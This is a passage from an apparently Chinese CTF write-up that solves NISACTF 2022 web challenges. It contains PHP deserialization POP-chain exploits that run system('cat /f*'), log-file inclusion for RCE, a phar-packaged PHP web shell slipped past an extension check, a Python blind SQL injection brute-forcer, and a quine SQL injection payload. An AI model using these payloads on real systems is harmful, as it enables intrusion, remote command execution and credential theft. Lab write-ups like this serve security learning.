</p><p>在NISA类的__call()方法中，对不可访问的fun进行赋值，触发__set方法。如何触发__call()方法了，<strong>对不存在的方法或者不可访问的方法进行调用时就会自动调用该方法。</strong></p><p>在TianXiWei类的__wakeup()方法中，调用了TianXiWei中不存在的方法nisa，触发__call()方法。当调用unserialize方法时，会触发__wakeup()方法。到此就结束了。</p><p>现在有两个pop链：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include &quot;waf.php&quot;;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>; <span class="comment">// 1 shell</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>; <span class="comment">//5 Ilovetxw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>; <span class="comment">//4 four</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>; <span class="comment">// 2 NISA</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>; <span class="comment">//3 Ilovetxw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>; <span class="comment">//fun = &quot;sixsixsix&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nisa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">NISA</span>();</span><br><span class="line"><span class="variable">$nisa</span>-&gt;fun = <span class="string">&quot;show&quot;</span>;</span><br><span class="line"><span class="variable">$nisa</span>-&gt;txw4ever = <span class="string">&quot;System(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$Ilt</span> = <span class="keyword">new</span> <span class="title class_">Ilovetxw</span>();</span><br><span class="line"><span class="variable">$Ilt</span>-&gt;su = <span class="variable">$nisa</span>; <span class="comment">//将$nisa对象当做函数利用时，会调用$nisa对象的__invoke()方法</span></span><br><span class="line"><span class="variable">$four</span> = <span class="keyword">new</span> <span class="title function_ invoke__">four</span>();</span><br><span class="line"><span class="variable">$four</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>;</span><br><span class="line"><span class="variable">$four</span>-&gt;a = <span class="variable">$Ilt</span>; <span class="comment">//将$Ilt对象当做字符串使用时会调用$Ilt对象里面的__tostring()方法</span></span><br><span class="line"><span class="variable">$Ilt</span>-&gt;huang = <span class="variable">$four</span>;  <span class="comment">//four里面有fun属性了，fun属性为一个不可访问的属性，给不可访问的属性赋值时会调用__set()方法</span></span><br><span class="line"><span class="variable">$TXW</span> = <span class="keyword">new</span> <span class="title class_">TianXiWei</span>();</span><br><span class="line"><span class="variable">$TXW</span>-&gt;ext=<span class="variable">$Ilt</span>; <span class="comment">//Ilovetxw并没有nisa方法 所以会触发__call</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$TXW</span>));</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include &quot;waf.php&quot;;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>; <span class="comment">// 1 shell</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>; <span class="comment">//5 Ilovetxw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>; <span class="comment">//4 four</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>; <span class="comment">// 2 NISA</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>; <span class="comment">//3 Ilovetxw</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>; <span class="comment">//fun = &quot;sixsixsix&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nisa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">NISA</span>();</span><br><span class="line"><span class="variable">$nisa</span>-&gt;txw4ever = <span class="string">&quot;System(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$Ilt</span> = <span class="keyword">new</span> <span class="title class_">Ilovetxw</span>();</span><br><span class="line"><span class="variable">$Ilt</span>-&gt;su = <span class="variable">$nisa</span>; <span class="comment">//将$nisa对象当做函数利用时，会调用__invoke()方法</span></span><br><span class="line"><span class="variable">$nisa</span>-&gt;fun = <span class="variable">$Ilt</span>; <span class="comment">//将$Ilt对象当做字符串利用时，会调用__toString()方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nisa</span>));</span><br></pre></td></tr></table></figure><h2 id="popchains"><a href="#popchains" class="headerlink" title="popchains"></a>popchains</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************pop your 2022*****************************/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page; <span class="comment">// 4 string = Make_a_Change的实例化对象，Make_a_Change类中没有page属性，触发Make_a_Change的__get方法。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">            <span class="comment">// 5 page = Road_is_Long的实例化对象，触发Road_is_Long的__tostring方法。</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>); <span class="comment">// 1 漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>); <span class="comment">// 2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;effort = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>(); <span class="comment">// 3 effort = Try_Work_Hard的实例化对象，对象当做函数调用，触发Try_Work_Hard类的__invoke方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我先包含的&#x2F;etc&#x2F;passwd，看是否可以包含到，再查看服务器类型，发现是nginx，直接包含&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，进行RCE既可以。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;/var/log/nginx/access.log&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$twh</span> = <span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>();</span><br><span class="line"><span class="variable">$mac</span> = <span class="keyword">new</span> <span class="title class_">Make_a_Change</span>();</span><br><span class="line"><span class="variable">$mac</span> -&gt; effort = <span class="variable">$twh</span>;</span><br><span class="line"><span class="variable">$rsl</span> = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$rsl</span> -&gt; <span class="keyword">string</span> = <span class="variable">$mac</span>;</span><br><span class="line"><span class="variable">$rsl1</span> = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$rsl1</span> -&gt; page = <span class="variable">$rsl</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$rsl1</span>));</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250623161421278.png" class="" title="image-20250623161421278"><h2 id="bingdundun"><a href="#bingdundun" class="headerlink" title="bingdundun~"></a>bingdundun~</h2><img src="/CTFwp/NISACTF-2022/image-20250623170217628.png" class="" title="image-20250623170217628"><p>包含了一下index.php，发现会进行无限包含，自带php后缀。</p><p>再进行文件上传的时候，发现只能上传png后缀和zip后缀；只检测后缀并没有检测文件内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&lt;?=`$_POST[1]`?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;payload.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.php&#x27;</span>,<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>将payload.phar文件更改为zip后缀或png后缀的文件；进行文件上传，再进行命令执行即可。</p><img src="/CTFwp/NISACTF-2022/image-20250623171406354.png" class="" title="image-20250623171406354"><p><strong>phar:&#x2F;&#x2F;伪协议识别的是<code>&lt;?php __HALT_COMPILER();?&gt;</code>作为标志，而不是后缀。</strong></p><h2 id="join-us"><a href="#join-us" class="headerlink" title="join-us"></a>join-us</h2><p>进入登录，发现：</p><img src="/CTFwp/NISACTF-2022/image-20250626111803645.png" class="" title="image-20250626111803645"><p>这里应该有注入点；测试注入点的闭合方式。</p><p>输入单引号：</p><img src="/CTFwp/NISACTF-2022/image-20250626111929667.png" class="" title="image-20250626111929667"><p>报错，说明闭合方式为单引号。</p><p>在准备测试列数的时候，发现by被过滤了。</p><p>在这里进行一次模糊测试。</p><p>union被过滤，联合查询注入不行,堆叠注入也不行,&#x3D;也被过滤了,布尔盲注和时间盲注也不行。</p><p>报错注入可以：</p><img src="/CTFwp/NISACTF-2022/image-20250626141044029.png" class="" title="image-20250626141044029"><img src="/CTFwp/NISACTF-2022/image-20250626141233997.png" class="" title="image-20250626141233997"><p>mid截取(substr被过滤)：</p><img src="/CTFwp/NISACTF-2022/image-20250626141437647.png" class="" title="image-20250626141437647"><img src="/CTFwp/NISACTF-2022/image-20250626141605973.png" class="" title="image-20250626141605973"><img src="/CTFwp/NISACTF-2022/image-20250626141621528.png" class="" title="image-20250626141621528"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">information_schema,</span><br><span class="line">mysql,</span><br><span class="line">ctftraining,</span><br><span class="line">performance_schema,</span><br><span class="line">test,</span><br><span class="line">sqlsql</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250626142741439.png" class="" title="image-20250626142741439"><p>图片缺失：<code>concat(table_name) from</code></p><p>查一下FLAG_TABLE；由于过滤了column；union也被过滤了，这里用join泄露列名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FLAG_TABLE,</span><br><span class="line">news,</span><br><span class="line">users</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250626143243011.png" class="" title="image-20250626143243011"><img src="/CTFwp/NISACTF-2022/image-20250626143402495.png" class="" title="image-20250626143402495"><p>感觉不可能在FLAG_TABLE，查sqlsql数据库</p><img src="/CTFwp/NISACTF-2022/image-20250626144208756.png" class="" title="image-20250626144208756"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Fal_flag,</span><br><span class="line">output</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250626144459677.png" class="" title="image-20250626144459677"><img src="/CTFwp/NISACTF-2022/image-20250626144520873.png" class="" title="image-20250626144520873"><img src="/CTFwp/NISACTF-2022/image-20250626144547444.png" class="" title="image-20250626144547444"><p>说flag不在这个里面，在另一个里面。</p><img src="/CTFwp/NISACTF-2022/image-20250626144648697.png" class="" title="image-20250626144648697"><img src="/CTFwp/NISACTF-2022/image-20250626144710012.png" class="" title="image-20250626144710012"><p>mid截取flag：</p><img src="/CTFwp/NISACTF-2022/image-20250626144752938.png" class="" title="image-20250626144752938"><img src="/CTFwp/NISACTF-2022/image-20250626144807238.png" class="" title="image-20250626144807238"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;cae214f6-f54d-4ed8-a005-fda8094bb7a3&#125;</span><br></pre></td></tr></table></figure><h2 id="hardsql"><a href="#hardsql" class="headerlink" title="hardsql"></a>hardsql</h2><p>题目提示：</p><img src="/CTFwp/NISACTF-2022/image-20250629164242757.png" class="" title="image-20250629164242757"><p>先进行抓包：</p><p>username 输入 bilala，password 输入 <code>&#39;&#123;模糊测试的字典&#125;#</code>：进行模糊测试。</p><p>过滤的比较多，说一些主要的：&#x3D; substr 空格。</p><p>再进行测试的时候发现：<code>&#39; or 1</code>和<code>&#39; or 0</code> 这两个的返回结果不一样，觉得可以进行布尔盲注爆破出passwd。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node5.anna.nssctf.cn:21135/login.php&#x27;</span></span><br><span class="line">char_list = string.digits + string.ascii_letters + <span class="string">&#x27;_~&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> char_list:</span><br><span class="line">        payload = <span class="string">f&quot;&#x27;/**/or/**/mid((select/**/passwd/**/from/**/users/**/where/**/username/**/like/**/&#x27;bilala&#x27;),<span class="subst">&#123;i&#125;</span>,1)/**/like/**/&#x27;<span class="subst">&#123;j+<span class="string">&#x27;%&#x27;</span>&#125;</span>&#x27;#&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;bilala&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wrong password&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            password += j</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;result:&#x27;</span>+password)</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250629164902748.png" class="" title="image-20250629164902748"><p>登录：</p><img src="/CTFwp/NISACTF-2022/image-20250629164931212.png" class="" title="image-20250629164931212"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># passwd 的返回结果 等于 我们输入的内容。</span></span><br><span class="line"><span class="comment"># password 不能等于 b2f2d15b3ae082ca29697d8dcd420fd7</span></span><br><span class="line"><span class="comment"># 得到flag。</span></span><br><span class="line"><span class="comment"># quine注入</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bilala&amp;passwd=&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,0x22,0x27),0x2e,&quot;.&quot;)#&#x27;,0x22,0x27),0x2e,&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,0x22,0x27),0x2e,&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure><img src="/CTFwp/NISACTF-2022/image-20250629165120987.png" class="" title="image-20250629165120987"><h2 id="level-up"><a href="#level-up" class="headerlink" title="level-up"></a>level-up</h2><img src="/CTFwp/NISACTF-2022/image-20250630101836190.png" class="" title="image-20250630101836190"><p>disallow: 在robots.txt中才会出现；访问robots.txt即可。</p><img src="/CTFwp/NISACTF-2022/image-20250630101934566.png" class="" title="image-20250630101934566"><p>进入第二关：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is level 2</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>];</span><br><span class="line">    <span class="variable">$a2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a1</span> == <span class="variable">$a2</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$a2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 2 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>强制类型转换为string，md5强碰撞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 